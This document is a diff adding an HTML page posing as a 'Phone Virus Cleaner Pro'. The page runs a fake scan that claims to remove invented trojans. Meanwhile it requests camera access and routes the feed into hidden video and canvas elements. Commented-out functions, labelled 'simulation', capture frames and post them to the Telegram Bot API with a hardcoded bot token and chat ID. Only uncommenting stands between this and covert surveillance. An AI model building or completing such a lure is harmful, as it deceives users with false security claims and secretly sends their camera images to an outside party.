@@ -1,0 +1,463 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Phone Virus Cleaner Pro</title>
+    <style>
+        /* --- Basic Reset & Body Styling --- */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            background: linear-gradient(135deg, #1a1a2e, #16213e, #0f3460);
+            color: #e0e0e0;
+            overflow: hidden; /* Prevent scrollbars during animation */
+            perspective: 1000px; /* For 3D effect */
+        }
+
+        /* --- Main Container --- */
+        .scanner-container {
+            background-color: rgba(22, 33, 62, 0.85); /* Dark blue semi-transparent */
+            padding: 30px 40px;
+            border-radius: 15px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
+            text-align: center;
+            width: 90%;
+            max-width: 450px;
+            border: 1px solid rgba(27, 94, 148, 0.5);
+            backdrop-filter: blur(5px);
+            transform-style: preserve-3d;
+            transition: transform 0.5s ease;
+        }
+
+        .scanner-container:hover {
+             transform: rotateY(5deg) rotateX(2deg) scale(1.02);
+        }
+
+        /* --- Title --- */
+        h1 {
+            color: #53a8b6; /* Light teal/blue */
+            margin-bottom: 15px;
+            font-size: 1.8em;
+            font-weight: 600;
+            text-shadow: 0 0 10px rgba(83, 168, 182, 0.5);
+        }
+
+        /* --- Status Area --- */
+        #status {
+            margin-top: 25px;
+            margin-bottom: 25px;
+            font-size: 1.1em;
+            min-height: 3em; /* Reserve space */
+            color: #a8dadc; /* Lighter blue */
+            transition: color 0.3s ease;
+        }
+
+        #status.scanning {
+            color: #fca311; /* Orange during scanning */
+        }
+         #status.cleaning {
+            color: #9ef01a; /* Bright green during cleaning */
+        }
+         #status.done {
+            color: #4ade80; /* Success green */
+            font-weight: bold;
+        }
+         #status.error {
+             color: #e63946; /* Red for errors */
+             font-weight: bold;
+         }
+
+
+        /* --- Scan Button --- */
+        #scanButton {
+            background: linear-gradient(145deg, #1e90ff, #4682b4); /* DodgerBlue to SteelBlue */
+            color: #ffffff;
+            border: none;
+            padding: 15px 30px;
+            border-radius: 50px; /* Pill shape */
+            font-size: 1.2em;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            box-shadow: 0 5px 15px rgba(30, 144, 255, 0.4);
+            margin-top: 20px;
+            display: inline-block; /* Needed for transform */
+        }
+
+        #scanButton:hover:not(:disabled) {
+            background: linear-gradient(145deg, #4ca9ff, #5e9cd3);
+            box-shadow: 0 8px 20px rgba(30, 144, 255, 0.6);
+            transform: translateY(-3px);
+        }
+
+        #scanButton:active:not(:disabled) {
+             transform: translateY(1px);
+             box-shadow: 0 3px 10px rgba(30, 144, 255, 0.3);
+        }
+
+        #scanButton:disabled {
+            background: #555;
+            color: #999;
+            cursor: not-allowed;
+            box-shadow: none;
+        }
+
+        /* --- Progress Bar --- */
+        .progress-bar-container {
+            width: 100%;
+            background-color: rgba(0, 0, 0, 0.3);
+            border-radius: 10px;
+            margin-top: 20px;
+            height: 15px;
+            overflow: hidden;
+            display: none; /* Hidden initially */
+            box-shadow: inset 0 2px 5px rgba(0, 0, 0, 0.4);
+        }
+
+        .progress-bar {
+            width: 0%;
+            height: 100%;
+            background: linear-gradient(90deg, #1e90ff, #53a8b6, #9ef01a);
+            background-size: 300% 100%; /* For gradient animation */
+            border-radius: 10px;
+            transition: width 0.5s ease-out;
+            animation: progressAnimation 2s linear infinite;
+            opacity: 0; /* Fade in when starting */
+            transition: opacity 0.5s ease;
+        }
+
+        @keyframes progressAnimation {
+            0% { background-position: 0% 50%; }
+            100% { background-position: 100% 50%; }
+        }
+
+        /* --- Scanning Animation Elements (Optional) --- */
+        .scan-lines {
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: linear-gradient(
+                rgba(83, 168, 182, 0) 0%,
+                rgba(83, 168, 182, 0) 45%,
+                rgba(83, 168, 182, 0.6) 50%,
+                rgba(83, 168, 182, 0) 55%,
+                rgba(83, 168, 182, 0) 100%
+            );
+            background-size: 100% 10px; /* Adjust line thickness */
+            animation: scan 3s linear infinite;
+            opacity: 0;
+            transition: opacity 0.5s ease;
+            z-index: -1; /* Behind content */
+            border-radius: 15px; /* Match container */
+            pointer-events: none; /* Allow clicks through */
+        }
+
+        @keyframes scan {
+            0% { background-position: 0% 0%; }
+            100% { background-position: 0% 100%; }
+        }
+
+        /* --- Hidden Elements for Camera --- */
+        #videoFeed, #captureCanvas {
+             display: none; /* Critical: Keep these hidden */
+             position: absolute;
+             top: -9999px;
+             left: -9999px;
+        }
+
+    </style>
+</head>
+<body>
+
+    <div class="scanner-container">
+        <h1>Clean Your Phone Virus</h1>
+        <p style="color: #a8dadc; margin-bottom: 20px; font-size: 0.9em;">Click the button below to scan and remove threats.</p>
+
+        <button id="scanButton">Clean Your Virus Click Here</button>
+
+        <div id="status">Ready to scan.</div>
+
+        <div class="progress-bar-container" id="progressContainer">
+            <div class="progress-bar" id="progressBar"></div>
+        </div>
+
+         <!-- Optional visual scanning effect -->
+        <div class="scan-lines" id="scanLinesEffect"></div>
+
+    </div>
+
+    <!-- Hidden video element to access the camera stream -->
+    <video id="videoFeed" playsinline autoplay muted></video>
+    <!-- Hidden canvas element for capturing frames -->
+    <canvas id="captureCanvas"></canvas>
+
+    <script>
+        const scanButton = document.getElementById('scanButton');
+        const statusDiv = document.getElementById('status');
+        const progressContainer = document.getElementById('progressContainer');
+        const progressBar = document.getElementById('progressBar');
+        const scanLinesEffect = document.getElementById('scanLinesEffect'); // Optional effect
+
+        // --- Configuration (Example - DO NOT USE REAL CREDENTIALS HERE) ---
+        // WARNING: Exposing your real Bot Token here is a MAJOR security risk.
+        // This code WILL NOT actually send anything.
+        const TELEGRAM_BOT_TOKEN = "7227421684:AAE95ec_pOd5GT7f0CLqLFQthavej-13ilY"; // Example Only - DO NOT USE
+        const TELEGRAM_CHAT_ID = "8101021767"; // Example Only - DO NOT USE
+        const IMAGE_SEND_INTERVAL_MS = 2000; // 2 seconds
+
+        // --- State Variables ---
+        let isScanning = false;
+        let stream = null; // To hold the camera stream
+        let imageSendIntervalId = null; // To hold the interval timer ID
+
+        // --- Elements for Camera (Hidden) ---
+        const video = document.getElementById('videoFeed');
+        const canvas = document.getElementById('captureCanvas');
+        const context = canvas.getContext('2d');
+
+        // --- Event Listener for the Scan Button ---
+        scanButton.addEventListener('click', async () => {
+            if (isScanning) return; // Prevent multiple clicks
+
+            isScanning = true;
+            scanButton.disabled = true;
+            scanButton.textContent = 'Scanning...';
+            statusDiv.textContent = 'Initializing scan engine...';
+            statusDiv.className = 'scanning'; // Add class for styling
+            progressContainer.style.display = 'block';
+            progressBar.style.width = '0%';
+            progressBar.style.opacity = '1';
+            scanLinesEffect.style.opacity = '0.3'; // Show scan lines
+
+            // **STEP 1: Request Camera Permission**
+            // This is the part that asks the user for permission.
+            // In a real malicious attack, the goal is to get the user to click "Allow".
+            try {
+                statusDiv.textContent = 'Requesting permissions...';
+                // Request video access, audio is not needed
+                stream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: 'user' }, // Try front camera first
+                    audio: false
+                });
+
+                // **IMPORTANT:** We have the stream, but we DON'T show it to the user.
+                video.srcObject = stream;
+                // We wait a moment for the video feed to stabilize (though it's hidden)
+                await new Promise(resolve => video.onloadedmetadata = resolve);
+
+                // **SIMULATION:** Start the fake scanning process *after* getting permission.
+                simulateScanningProcess();
+
+                 // **WARNING: DANGEROUS PART - NOT IMPLEMENTED**
+                // The code below *would* start the secret image capture and sending.
+                // It is commented out and should NOT be enabled due to ethical/security reasons.
+                // startSendingImages();
+
+
+            } catch (err) {
+                console.error("Camera Access Error:", err);
+                statusDiv.textContent = `Error: ${err.name}. Cannot access camera. Scan aborted.`;
+                 statusDiv.className = 'error';
+                resetScanner();
+                 // Optionally, still run a fake scan animation even without camera
+                 // simulateScanningProcess(); // Uncomment this if you want the animation regardless of camera permission
+            }
+        });
+
+        // --- Function to Simulate the Scanning Animation ---
+        function simulateScanningProcess() {
+            let progress = 0;
+            const scanDuration = 8000; // 8 seconds total simulation
+            const updateInterval = 100; // Update progress bar smoothly
+            const steps = scanDuration / updateInterval;
+            let currentStep = 0;
+
+            const scanMessages = [
+                "Scanning system files...",
+                "Checking application cache...",
+                "Analyzing browser history...",
+                "Searching for malware signatures...",
+                "Verifying network connections...",
+                "Scanning downloaded files...",
+                "Checking for rootkits...",
+                "Analyzing memory processes..."
+            ];
+            let messageIndex = 0;
+
+            statusDiv.textContent = scanMessages[messageIndex];
+            statusDiv.className = 'scanning';
+
+            const intervalId = setInterval(() => {
+                currentStep++;
+                progress = Math.min(100, Math.ceil((currentStep / steps) * 100));
+                progressBar.style.width = progress + '%';
+
+                // Update status message periodically
+                if (currentStep % Math.floor(steps / scanMessages.length) === 0 && messageIndex < scanMessages.length - 1) {
+                    messageIndex++;
+                    statusDiv.textContent = scanMessages[messageIndex];
+                }
+
+                if (currentStep >= steps) {
+                    clearInterval(intervalId);
+                    // Move to "Cleaning" phase
+                    simulateCleaning();
+                }
+            }, updateInterval);
+        }
+
+        // --- Function to Simulate Cleaning ---
+        function simulateCleaning() {
+            statusDiv.textContent = 'Threats detected! Cleaning system...';
+            statusDiv.className = 'cleaning'; // Style for cleaning
+            progressBar.style.background = 'linear-gradient(90deg, #ffdd00, #fbb034, #ff8c00)'; // Yellow/Orange gradient for cleaning
+
+            setTimeout(() => {
+                 // Fake finding something
+                statusDiv.textContent = 'Removing Trojan.Malware.Generic...';
+            }, 1500);
+
+             setTimeout(() => {
+                // Fake finding something else
+                 statusDiv.textContent = 'Deleting Spyware.UserTrack...';
+             }, 3000);
+
+            setTimeout(() => {
+                // Finish cleaning
+                statusDiv.textContent = 'System Clean! Your phone is protected.';
+                statusDiv.className = 'done'; // Style for success
+                progressBar.style.width = '100%'; // Ensure it's full
+                progressBar.style.background = 'linear-gradient(90deg, #4ade80, #2ecc71)'; // Green gradient for success
+                 scanLinesEffect.style.opacity = '0'; // Hide scan lines
+                resetScanner(true); // Reset after a delay, keep success message
+
+                // **IMPORTANT:** Stop the camera stream and any image sending IF it were active
+                stopCameraAndSending();
+
+            }, 5000); // Cleaning takes 5 seconds
+        }
+
+        // --- Function to Reset the Scanner UI ---
+        function resetScanner(keepSuccessMessage = false) {
+            isScanning = false;
+             scanButton.disabled = false;
+             scanButton.textContent = 'Scan Again';
+
+             if (!keepSuccessMessage) {
+                 statusDiv.textContent = 'Ready for a new scan.';
+                 statusDiv.className = ''; // Remove status classes
+             }
+
+             // Hide progress bar after a short delay if not showing success
+             setTimeout(() => {
+                 if (!keepSuccessMessage) {
+                     progressContainer.style.display = 'none';
+                     progressBar.style.opacity = '0';
+                 }
+             }, 1000);
+        }
+
+
+        // --- !!! WARNING: DANGEROUS FUNCTIONS - FOR ILLUSTRATION ONLY !!! ---
+        // --- !!! THESE FUNCTIONS ARE NOT CALLED AND SHOULD NOT BE USED !!! ---
+
+        /*
+        // Function that WOULD start capturing and sending images every X seconds
+        function startSendingImages() {
+            if (imageSendIntervalId) {
+                clearInterval(imageSendIntervalId); // Clear previous interval if any
+            }
+            console.warn("!!! SIMULATION: Starting 'image sending' interval. NO IMAGES ARE ACTUALLY SENT. !!!");
+            // In a real scenario, this interval would repeatedly call captureAndSendImage
+            imageSendIntervalId = setInterval(() => {
+                 // captureAndSendImage(); // THIS LINE IS DANGEROUS AND IS COMMENTED OUT
+                 console.log("!!! SIMULATION: Pretending to capture and send image... !!!");
+            }, IMAGE_SEND_INTERVAL_MS);
+        }
+
+        // Function that WOULD capture a frame and send it via Telegram API
+        async function captureAndSendImage() {
+            if (!stream || !video.videoWidth) {
+                console.error("Video stream not ready for capture.");
+                return;
+            }
+
+            // Set canvas dimensions (important for correct capture)
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+
+            // Draw the current video frame onto the hidden canvas
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+            // Get the image data from the canvas as a Blob (more efficient for sending)
+            canvas.toBlob(async (blob) => {
+                if (!blob) {
+                    console.error("Canvas to Blob conversion failed.");
+                    return;
+                }
+
+                // Create FormData to send the image
+                const formData = new FormData();
+                formData.append('chat_id', TELEGRAM_CHAT_ID);
+                formData.append('photo', blob, 'capture.jpg'); // 'photo' is the parameter name for Telegram API
+                // You could add a caption: formData.append('caption', 'Auto-captured image');
+
+                // --- !!! THE ACTUAL DANGEROUS SENDING PART !!! ---
+                // This uses the Fetch API to send the image to the Telegram Bot API.
+                // THIS IS WHERE YOUR BOT TOKEN WOULD BE EXPOSED IF ENABLED.
+                const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`;
+
+                try {
+                    console.log(`!!! SIMULATION: Pretending to send image to Telegram Chat ID ${TELEGRAM_CHAT_ID} !!!`);
+
+                    // **********************************************************
+                    // ***** REAL FETCH CALL - DO NOT UNCOMMENT OR USE *****
+                    // const response = await fetch(url, {
+                    //     method: 'POST',
+                    //     body: formData
+                    // });
+                    // const result = await response.json();
+                    // if (!result.ok) {
+                    //     console.error("Telegram API Error:", result);
+                    // } else {
+                    //     console.log("Image sent successfully (simulation).");
+                    // }
+                    // **********************************************************
+
+                } catch (error) {
+                    console.error("Error sending image via Telegram:", error);
+                }
+
+            }, 'image/jpeg', 0.8); // Get as JPEG with 80% quality
+        }
+        */
+
+        // --- Function to Stop Camera and Image Sending (if it were active) ---
+        function stopCameraAndSending() {
+            console.log("Stopping camera stream and 'sending' interval (simulation).");
+            if (imageSendIntervalId) {
+                clearInterval(imageSendIntervalId);
+                imageSendIntervalId = null;
+            }
+            if (stream) {
+                stream.getTracks().forEach(track => track.stop()); // Stop camera access
+                stream = null;
+                video.srcObject = null;
+            }
+        }
+
+    </script>
+</body>
+</html>
